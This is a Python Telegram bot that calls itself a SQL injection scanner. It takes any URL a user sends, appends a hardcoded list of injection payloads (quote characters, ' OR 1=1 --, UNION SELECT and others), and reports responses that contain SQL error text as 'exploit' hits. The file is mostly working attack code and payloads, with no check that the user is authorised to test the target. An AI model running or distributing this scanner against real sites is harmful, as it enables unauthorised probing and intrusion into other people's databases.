#!/usr/bin/python3
from telegram.ext import (Updater, CommandHandler, MessageHandler,
Filters, ConversationHandler)
import telegram
import requests



class SimpleSQLi:
    updater = Updater(token="YOUR TOKEN !!! ") # You need To Change this .
    dispatcher = updater.dispatcher
    injurl = []
    true = []
    def start():

        start = '''Welcome To The :
        [+] Simple SQL Injection Scanner [+]

        [En]
        - How to use it ?
        - /info about me .
        - /payloads To see the list of payloads
        - /inj for trying injection the payloads

        example:
        /inj http://evil.com/index.php?id=1

        ----------------------------------------

        [Ar]
        - طريقه الاستخدام ؟
        - معلوماتي /info
        - لعرض لسته البايلودات المستخدمه /payloads
        - لتجربه الحقن /inj

        مثال:
        /inj http://evil.com/index.php?id=1

        [*] Programing By : @OxZoRo [*]
        '''
        return start
    def payloads():
        payloads ='''
        '
        ''
        `
        ``
        ,
        "
        ""
        /
        //
        chr(92)
        chr(92)+chr(92)
        ;
        ' or "
        -- or #
        ' OR '1
        ' OR 1 -- -
        " OR "" = "
        " OR 1 = 1 -- -
        ' OR '' = '
        '='
        'LIKE'
        '=0--+
         OR 1=1
        ' OR 'x'='x
        ' AND id IS NULL; --
        '''''''''''''UNION SELECT '2
        OR 1=1
        OR 1=0
        OR x=x
        OR x=y
        OR 1=1#
        OR 1=0#
        OR x=x#
        OR x=y#
        OR 1=1--
        OR 1=0--
        OR x=x--
        OR x=y--
        '''
        return payloads
    def info():

        info = '''
        [?] Github : https://Github.com/0xZoRo
        [?] Instagram : @ 9du
        [?] Telegram : @OxZoRo
        [?] From : Kuwait City +965
        '''
        return info

    def inj1():
        payl =[
        "'",'"',"`","``",",",'""',"/","//",chr(92),chr(92)+chr(92),";","-- or #","' OR '1","' OR 1 -- -",'" OR 1 = 1 -- -',"' OR '' = '","'='","'LIKE'","'=0--+"" OR 1=1","' OR 'x'='x","' AND id IS NULL; --",
        "'''''''''''''UNION SELECT '2","OR 1=1","OR 1=0","OR x=x","OR x=y","OR 1=1#","OR 1=0#","OR x=x#","OR x=y#","OR 1=1-- ","OR 1=0-- ","OR x=x-- ","OR x=y-- "
        ] # You can Change it if u want .. :)
        for i in payl:
            try:
                target1 = ''.join(SimpleSQLi.injurl)
                req1 = requests.get(url=f'{target1}{i}')
                chek = req1.text
                if "SQL syntax" in chek:
                    exp = f'exploit : {target1}{i}'
                    SimpleSQLi.true.append(exp)

                elif "MySQL" in chek:
                    exp = f'exploit : {target1}{i}'
                    SimpleSQLi.true.append(exp)

                elif "SELECT" in chek:
                    exp = f'exploit : {target1}{i}'
                    SimpleSQLi.true.append(exp)

                elif "WHERE id" in chek:
                    exp = f'exploit : {target1}{i}'
                    SimpleSQLi.true.append(exp)
            except:
                SimpleSQLi.true.clear()
                SimpleSQLi.injurl.clear()

    def mesgs_hand(update,context):
        try :
            if(update.message.text == "/start"):
                context.bot.send_message(
                   chat_id=update.message.chat_id,
                   text=SimpleSQLi.start())
            elif(update.message.text == "/payloads"):
                context.bot.send_message(
                chat_id=update.message.chat_id,
                text=SimpleSQLi.payloads())
            elif(update.message.text == "/info"):
                context.bot.send_message(
                chat_id=update.message.chat_id,
                text=SimpleSQLi.info())
            elif("/inj" in update.message.text):
                inj = update.message.text.strip('/inj ')
                context.bot.send_message(
                chat_id=update.message.chat_id,
                text='[+] Just Wait For Scaning [+] ')
                SimpleSQLi.injurl.append(inj)
                SimpleSQLi.inj1()
                SimpleSQLi.injurl.clear()
                context.bot.send_message(
                chat_id=update.message.chat_id,
                text='\n'.join(SimpleSQLi.true))
                SimpleSQLi.true.clear()
                context.bot.send_message(
                chat_id=update.message.chat_id,
                text='[-] injection Done [-]')
            elif(update.message.text != "AnythingHere1"):
                context.bot.send_message(
                chat_id=update.message.chat_id,
                text='[#] Need some help? ask me : @OxZoRo [#]\n/info')
        except telegram.error.BadRequest:
            context.bot.send_message(
            chat_id=update.message.chat_id,
            text='[-] Not injection [-]')
    messages_handler = MessageHandler(Filters.text,mesgs_hand)
    dispatcher.add_handler(messages_handler)
    updater.start_polling()
    
    # Code it By : @0xZoRo
    # Github : https://Github.com/0xZoRo
    # Instagram : @ 9du
